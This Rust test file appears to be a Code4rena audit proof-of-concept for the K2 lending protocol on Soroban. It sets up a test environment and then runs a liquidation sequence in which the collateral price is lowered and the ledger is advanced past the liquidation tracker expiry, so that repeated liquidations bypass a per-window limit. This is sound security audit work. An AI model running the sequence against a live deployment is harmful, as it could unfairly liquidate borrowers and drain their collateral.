#![cfg(test)]

//! # Code4rena K2 Audit — PoC Submission Template
//!
//! This crate is the starting point for Proof-of-Concept (PoC) tests
//! submitted to the K2 Lending Protocol audit contest.
//!
//! ## Prerequisites
//!
//! Optimized WASM binaries must be built *before* running tests in this crate,
//! because every contract is loaded via `soroban_sdk::contractimport!`:
//!
//! ```bash
//! ./build.sh
//! ```
//!
//! ## Running
//!
//! ```bash
//! cargo test --package k2-c4
//! ```
//!
//! ## Writing a PoC
//!
//! 1. Extend [`test_submission_validity`] at the bottom of this file.
//! 2. Call `Setup::new(&env)` to get a fully initialized protocol state:
//!    router, price oracle, two reserves (`asset_a` and `asset_b`), interest
//!    rate strategy, seeded LP liquidity, and a funded `user` account whose
//!    balances are pre-approved to the router.
//! 3. Perform whatever sequence of user operations demonstrates the bug.
//! 4. Assert the unexpected/incorrect state (e.g. `health_factor` above `WAD`
//!    when it should not be, funds drained, accounting broken, etc.).
//!
//! All in-scope contracts are imported below, so you can register and wire up
//! additional contracts (incentives, liquidation engine, swap adapters, …)
//! without editing this file's imports.

// =============================================================================
// Contract WASM imports — every in-scope contract is available here.
// =============================================================================

/// Kinetic Router — main lending pool contract and entry point.
pub mod kinetic_router {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_kinetic_router.optimized.wasm"
    );
}

/// aToken — interest-bearing supply position token.
pub mod a_token {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_a_token.optimized.wasm"
    );
}

/// Debt Token — non-transferable variable-rate debt position token.
pub mod debt_token {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_debt_token.optimized.wasm"
    );
}

/// Price Oracle — asset price feeds with circuit breaker protection.
pub mod price_oracle {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_price_oracle.optimized.wasm"
    );
}

/// Pool Configurator — reserve deployment and parameter management.
pub mod pool_configurator {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_pool_configurator.optimized.wasm"
    );
}

/// Liquidation Engine — liquidation logic.
pub mod liquidation_engine {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_liquidation_engine.optimized.wasm"
    );
}

/// Interest Rate Strategy — utilization-based rate curves.
pub mod interest_rate_strategy {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_interest_rate_strategy.optimized.wasm"
    );
}

/// Incentives — reward distribution.
pub mod incentives {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_incentives.optimized.wasm"
    );
}

/// Treasury — protocol fee collection.
pub mod treasury {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_treasury.optimized.wasm"
    );
}

/// Flash Liquidation Helper — validation logic for two-step flash liquidation.
pub mod flash_liquidation_helper {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_flash_liquidation_helper.optimized.wasm"
    );
}

/// Base Token — standard SEP-41 token implementation.
pub mod base_token {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/k2_token.optimized.wasm"
    );
}

/// Aquarius DEX swap adapter.
pub mod aquarius_swap_adapter {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/aquarius_swap_adapter.optimized.wasm"
    );
}

/// Soroswap DEX swap adapter.
pub mod soroswap_swap_adapter {
    soroban_sdk::contractimport!(
        file = "../../target/wasm32v1-none/release/soroswap_swap_adapter.optimized.wasm"
    );
}

// =============================================================================
// Mock Reflector oracle — required by `price_oracle.initialize()`.
// The real Reflector contract lives outside the audit scope; for PoCs we
// only need an object that answers `decimals()`.
// =============================================================================

use soroban_sdk::{contract, contractimpl};

#[contract]
pub struct MockReflector;

#[contractimpl]
impl MockReflector {
    pub fn decimals(_env: Env) -> u32 {
        14
    }
}

// =============================================================================
// Setup scaffold — one call gives wardens a ready-to-use protocol state.
// =============================================================================

use price_oracle::Asset as OracleAsset;
use soroban_sdk::{
    testutils::{Address as _, Ledger, LedgerInfo},
    token, Address, Env, IntoVal, String, Symbol, Vec,
};

/// Convenience constants used by [`Setup::new`]. Exposed so wardens can
/// reference them when asserting expected balances / prices.
pub const ASSET_DECIMALS: u32 = 7;
/// $1.00 expressed in the oracle's 14-decimal fixed-point format.
pub const PRICE_ONE_DOLLAR: u128 = 100_000_000_000_000;
/// Initial LP deposit per reserve (100M whole tokens at 7 decimals).
pub const LP_SEED: i128 = 1_000_000_000_000_000;
/// Starting balance minted to `user` in each reserve (1 000 whole tokens).
pub const USER_STARTING_BALANCE: i128 = 10_000_000_000;

/// Fully-initialized protocol state.
///
/// Two reserves are registered:
/// - **`asset_a`**: higher-quality collateral (LTV 80%, liq. threshold 85%)
/// - **`asset_b`**: lower-quality collateral (LTV 50%, liq. threshold 65%)
///
/// Both priced at $1.00 so dollar-value math lines up trivially.
///
/// Protocol liquidity is seeded by `liquidity_provider` (100M of each asset),
/// and `user` holds [`USER_STARTING_BALANCE`] of each asset with the router
/// already approved as a spender — so `router.supply`, `router.borrow`,
/// `router.repay`, `router.withdraw`, etc. can be called immediately.
pub struct Setup<'a> {
    pub env: &'a Env,

    // --- Principals ---
    pub admin: Address,
    pub emergency_admin: Address,
    pub user: Address,
    pub liquidity_provider: Address,

    // --- Core contracts ---
    pub router: kinetic_router::Client<'a>,
    pub router_addr: Address,
    pub oracle: price_oracle::Client<'a>,
    pub oracle_addr: Address,
    pub pool_configurator: Address,
    pub interest_rate_strategy: Address,
    pub treasury: Address,
    pub dex_router: Address,

    // --- Reserve A (high quality) ---
    pub asset_a: Address,
    pub asset_a_token: token::Client<'a>,
    pub asset_a_mint: token::StellarAssetClient<'a>,
    pub a_token_a: Address,
    pub debt_token_a: Address,

    // --- Reserve B (lower quality) ---
    pub asset_b: Address,
    pub asset_b_token: token::Client<'a>,
    pub asset_b_mint: token::StellarAssetClient<'a>,
    pub a_token_b: Address,
    pub debt_token_b: Address,
}

impl<'a> Setup<'a> {
    /// Build a fully-initialized protocol state.
    ///
    /// Mocks all auths, resets the budget, and sets a fresh ledger — callers
    /// can simply do `let setup = Setup::new(&env);` and start exploiting.
    pub fn new(env: &'a Env) -> Self {
        env.mock_all_auths();
        #[allow(deprecated)]
        env.budget().reset_unlimited();
        env.ledger().set(LedgerInfo {
            sequence_number: 100,
            protocol_version: 23,
            timestamp: 1000,
            network_id: Default::default(),
            base_reserve: 10,
            min_temp_entry_ttl: 10,
            min_persistent_entry_ttl: 10,
            max_entry_ttl: 1_000_000,
        });

        let admin = Address::generate(env);
        let emergency_admin = admin.clone();
        let user = Address::generate(env);
        let liquidity_provider = Address::generate(env);

        // --- Deploy + initialize the price oracle ---
        let reflector_addr = env.register(MockReflector, ());
        let base_currency = Address::generate(env);
        let native_xlm = Address::generate(env);
        let oracle_addr = env.register(
            price_oracle::WASM,
            (
                admin.clone(),
                reflector_addr.clone(),
                base_currency.clone(),
                native_xlm.clone(),
            ),
        );
        let oracle = price_oracle::Client::new(env, &oracle_addr);

        // --- Deploy + initialize the main router ---
        let router_addr = env.register(kinetic_router::WASM, ());
        let router = kinetic_router::Client::new(env, &router_addr);
        let treasury = Address::generate(env);
        let dex_router = Address::generate(env);
        router.initialize(
            &admin,
            &emergency_admin,
            &oracle_addr,
            &treasury,
            &dex_router,
            &None,
        );

        // The pool configurator is stored as an authorized principal. Existing
        // PoC tests use a raw generated address here (auth passes under
        // `mock_all_auths`). Wardens may replace it with a deployed
        // `pool_configurator::WASM` instance if their scenario requires it.
        let pool_configurator = Address::generate(env);
        router.set_pool_configurator(&pool_configurator);

        // --- Interest rate strategy (shared across reserves) ---
        let interest_rate_strategy = env.register(
            interest_rate_strategy::WASM,
            (
                admin.clone(),
                0u128,
                40_000_000_000_000_000_000u128,
                100_000_000_000_000_000_000u128,
                800_000_000_000_000_000_000_000_000u128,
            ),
        );

        // --- Register two reserves ---
        let (asset_a, a_token_a, debt_token_a) = Self::register_reserve(
            env,
            &admin,
            &pool_configurator,
            &router,
            &router_addr,
            &oracle,
            &interest_rate_strategy,
            8000, // LTV 80%
            8500, // liq threshold 85%
        );
        let (asset_b, a_token_b, debt_token_b) = Self::register_reserve(
            env,
            &admin,
            &pool_configurator,
            &router,
            &router_addr,
            &oracle,
            &interest_rate_strategy,
            5000, // LTV 50%
            6500, // liq threshold 65%
        );

        let asset_a_token = token::Client::new(env, &asset_a);
        let asset_a_mint = token::StellarAssetClient::new(env, &asset_a);
        let asset_b_token = token::Client::new(env, &asset_b);
        let asset_b_mint = token::StellarAssetClient::new(env, &asset_b);

        // --- Seed protocol liquidity from the LP ---
        asset_a_mint.mint(&liquidity_provider, &LP_SEED);
        asset_b_mint.mint(&liquidity_provider, &LP_SEED);
        let approval_expiration = env.ledger().sequence() + 100_000;
        asset_a_token.approve(&liquidity_provider, &router_addr, &LP_SEED, &approval_expiration);
        asset_b_token.approve(&liquidity_provider, &router_addr, &LP_SEED, &approval_expiration);
        router.supply(
            &liquidity_provider,
            &asset_a,
            &(LP_SEED as u128),
            &liquidity_provider,
            &0u32,
        );
        router.supply(
            &liquidity_provider,
            &asset_b,
            &(LP_SEED as u128),
            &liquidity_provider,
            &0u32,
        );

        // --- Fund the user + pre-approve the router ---
        asset_a_mint.mint(&user, &USER_STARTING_BALANCE);
        asset_b_mint.mint(&user, &USER_STARTING_BALANCE);
        asset_a_token.approve(&user, &router_addr, &USER_STARTING_BALANCE, &approval_expiration);
        asset_b_token.approve(&user, &router_addr, &USER_STARTING_BALANCE, &approval_expiration);

        Setup {
            env,
            admin,
            emergency_admin,
            user,
            liquidity_provider,
            router,
            router_addr,
            oracle,
            oracle_addr,
            pool_configurator,
            interest_rate_strategy,
            treasury,
            dex_router,
            asset_a,
            asset_a_token,
            asset_a_mint,
            a_token_a,
            debt_token_a,
            asset_b,
            asset_b_token,
            asset_b_mint,
            a_token_b,
            debt_token_b,
        }
    }

    /// Deploy an underlying Stellar-asset token plus its aToken / debtToken
    /// pair, register the reserve on the router, and publish a $1.00 oracle
    /// price for it.
    fn register_reserve(
        env: &'a Env,
        admin: &Address,
        pool_configurator: &Address,
        router: &kinetic_router::Client<'a>,
        router_addr: &Address,
        oracle: &price_oracle::Client<'a>,
        interest_rate_strategy: &Address,
        ltv: u32,
        liquidation_threshold: u32,
    ) -> (Address, Address, Address) {
        let underlying_admin = Address::generate(env);
        let underlying = env.register_stellar_asset_contract_v2(underlying_admin);
        let underlying_addr = underlying.address();

        let a_token_addr = env.register(
            a_token::WASM,
            (
                admin.clone(),
                underlying_addr.clone(),
                router_addr.clone(),
                String::from_str(env, "aToken"),
                String::from_str(env, "aTKN"),
                ASSET_DECIMALS,
            ),
        );

        let debt_token_addr = env.register(
            debt_token::WASM,
            (
                admin.clone(),
                underlying_addr.clone(),
                router_addr.clone(),
                String::from_str(env, "debtToken"),
                String::from_str(env, "dTKN"),
                ASSET_DECIMALS,
            ),
        );

        let reserve_treasury = Address::generate(env);
        let params = kinetic_router::InitReserveParams {
            decimals: ASSET_DECIMALS,
            ltv,
            liquidation_threshold,
            liquidation_bonus: 500,
            reserve_factor: 1000,
            supply_cap: 0,
            borrow_cap: 0,
            borrowing_enabled: true,
            flashloan_enabled: true,
        };
        router.init_reserve(
            pool_configurator,
            &underlying_addr,
            &a_token_addr,
            &debt_token_addr,
            interest_rate_strategy,
            &reserve_treasury,
            &params,
        );

        let asset_enum = OracleAsset::Stellar(underlying_addr.clone());
        oracle.add_asset(admin, &asset_enum);
        oracle.set_manual_override(
            admin,
            &asset_enum,
            &Some(PRICE_ONE_DOLLAR),
            &Some(env.ledger().timestamp() + 604_800), // 7-day expiry
        );

        (underlying_addr, a_token_addr, debt_token_addr)
    }
}

// =============================================================================
// PoC template
// =============================================================================

/// ## Code4rena warden template — extend me.
///
/// This test must remain a `#[test]` that PASSES by default. Wardens submit
/// their PoCs by modifying the body below to trigger and assert the bug.
///
/// The sanity-check block at the start validates that the scaffold is wired
/// correctly. Leave it in place — if it starts failing, the build is broken
/// and *no* PoC in the repo will run. Add your exploit steps after the
/// "WARDEN: add your PoC below this line" marker.
#[test]
fn test_submission_validity() {
    let env = Env::default();
    let setup = Setup::new(&env);

    // ---------- Sanity check: protocol is in a known, functional state ----------

    // The user has starting balances of both assets, pre-approved to the router.
    assert_eq!(
        setup.asset_a_token.balance(&setup.user),
        USER_STARTING_BALANCE,
        "user should start with USER_STARTING_BALANCE of asset_a",
    );
    assert_eq!(
        setup.asset_b_token.balance(&setup.user),
        USER_STARTING_BALANCE,
        "user should start with USER_STARTING_BALANCE of asset_b",
    );

    // A plain supply round-trips through the router cleanly, proving that the
    // router, oracle, reserves, aToken, debtToken, and interest-rate strategy
    // are all correctly wired up.
    let deposit: u128 = 5_000_000_000; // 500 whole tokens of asset_a
    setup
        .router
        .supply(&setup.user, &setup.asset_a, &deposit, &setup.user, &0u32);

    let account = setup.router.get_user_account_data(&setup.user);
    assert!(
        account.total_collateral_base > 0,
        "collateral should be tracked after supply",
    );
    assert_eq!(account.total_debt_base, 0, "no debt yet");
    assert_eq!(
        account.health_factor,
        u128::MAX,
        "health factor should be infinite with no debt",
    );

    // ---------- WARDEN: PoC ----------
    let extra_mint: i128 = 100_000_000_000;
    setup.asset_a_mint.mint(&setup.user, &extra_mint);
    setup.asset_a_token.approve(&setup.user, &setup.router_addr, &extra_mint, &(env.ledger().sequence() + 100_000));
    setup
        .router
        .supply(&setup.user, &setup.asset_a, &75_000_000_000, &setup.user, &0u32);

    let attacker = Address::generate(&env);
    setup.asset_b_mint.mint(&attacker, &100_000_000_000); // Give attacker asset_b to cover debt
    setup.asset_b_token.approve(&attacker, &setup.router_addr, &100_000_000_000, &(env.ledger().sequence() + 100_000));

    // 1. User borrows 5000 asset_b
    let borrow_amount: u128 = 50_000_000_000;
    setup.router.borrow(
        &setup.user,
        &setup.asset_b,
        &borrow_amount,
        &1u32, // variable
        &0u32,
        &setup.user,
    );

    // 2. Drop oracle price of asset_a to trigger liquidation condition ($0.70)
    let asset_a_enum = price_oracle::Asset::Stellar(setup.asset_a.clone());
    let new_price: u128 = 70_000_000_000_000; // $0.70
    setup.oracle.reset_circuit_breaker(&setup.admin, &asset_a_enum);
    setup.oracle.set_manual_override(
        &setup.admin,
        &asset_a_enum,
        &Some(new_price),
        &Some(env.ledger().timestamp() + 604_800),
    );

    let account_pre_liq = setup.router.get_user_account_data(&setup.user);
    assert!(account_pre_liq.health_factor < k2_shared::WAD, "User should be liquidatable");

    // 3. First liquidation call: cover 2,000 asset_b (remaining debt will be 3,000 > 1,000)
    let debt_to_cover_1: u128 = 20_000_000_000;
    setup.router.liquidation_call(
        &attacker,
        &setup.asset_a,
        &setup.asset_b,
        &setup.user,
        &debt_to_cover_1,
        &false,
    );

    // Advance ledger sequence by 18,000 (exceeding LIQ_TRACKER_EXPIRY of 17,280)
    // to reset the cumulative liquidation amount tracker for the user.
    let mut ledger_info = env.ledger().get();
    ledger_info.sequence_number += 18000;
    ledger_info.timestamp += 90000; // also advance timestamp accordingly
    env.ledger().set(ledger_info);

    // Refresh manual overrides for both assets to update their timestamp and prevent staleness checks from failing
    setup.oracle.set_manual_override(
        &setup.admin,
        &asset_a_enum,
        &Some(new_price),
        &Some(env.ledger().timestamp() + 604_800),
    );
    let asset_b_enum = price_oracle::Asset::Stellar(setup.asset_b.clone());
    setup.oracle.set_manual_override(
        &setup.admin,
        &asset_b_enum,
        &Some(PRICE_ONE_DOLLAR),
        &Some(env.ledger().timestamp() + 604_800),
    );

    // 4. Second liquidation call: cover 1,000 asset_b (remaining debt will be 2,000 > 1,000)
    let debt_to_cover_2: u128 = 10_000_000_000;
    setup.router.liquidation_call(
        &attacker,
        &setup.asset_a,
        &setup.asset_b,
        &setup.user,
        &debt_to_cover_2,
        &false,
    );

    let account_post_liq = setup.router.get_user_account_data(&setup.user);
    // 20,000,000,000 debt tokens in WAD scaling is 2,000,000,000 * WAD.
    // Due to time advancement, a small amount of interest is accrued.
    assert!(account_post_liq.total_debt_base >= 2_000_000_000_000_000_000_000);
    assert!(account_post_liq.total_debt_base < 2_000_000_100_000_000_000_000);
}
